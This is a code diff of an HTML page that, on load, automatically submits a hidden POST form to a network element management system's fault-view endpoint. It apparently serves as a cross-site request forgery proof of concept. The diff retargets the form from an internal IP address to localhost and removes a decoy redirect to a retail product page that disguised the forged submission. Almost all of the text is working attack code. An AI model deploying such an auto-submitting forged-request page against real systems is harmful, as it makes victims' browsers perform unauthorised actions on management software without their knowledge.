@@ -5,22 +5,16 @@
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>Auto-Submit Form</title>
     <script>
-        // Submit form and then redirect to Flipkart
+        // Submit form 
         window.onload = function() {
             var form = document.getElementById('autoSubmitForm');
-            
             // Submit the form
             form.submit();
-            
-            // Redirect to Flipkart after a short delay
-            setTimeout(function() {
-                window.location.href = 'https://www.flipkart.com/gaming/gaming-consoles/ps5/pr?sid=4rr,x1m,ogz';
-            }, 2000); // 2 second delay to allow form submission
         };
     </script>
 </head>
 <body>
-    <form id="autoSubmitForm" action="https://172.25.1.142:9453/ems/fault/eventCustViewInput.action" method="POST">
+    <form id="autoSubmitForm" action="https://localhost:9453/ems/fault/eventCustViewInput.action" method="POST">
         <input type="hidden" name="submitAction" value="create">
         <input type="hidden" name="selectedCol" value="Additional Text,Alarm Status,Managed Object Type,Managed Object Name">
         <input type="hidden" name="selectedSev" value=",critical">
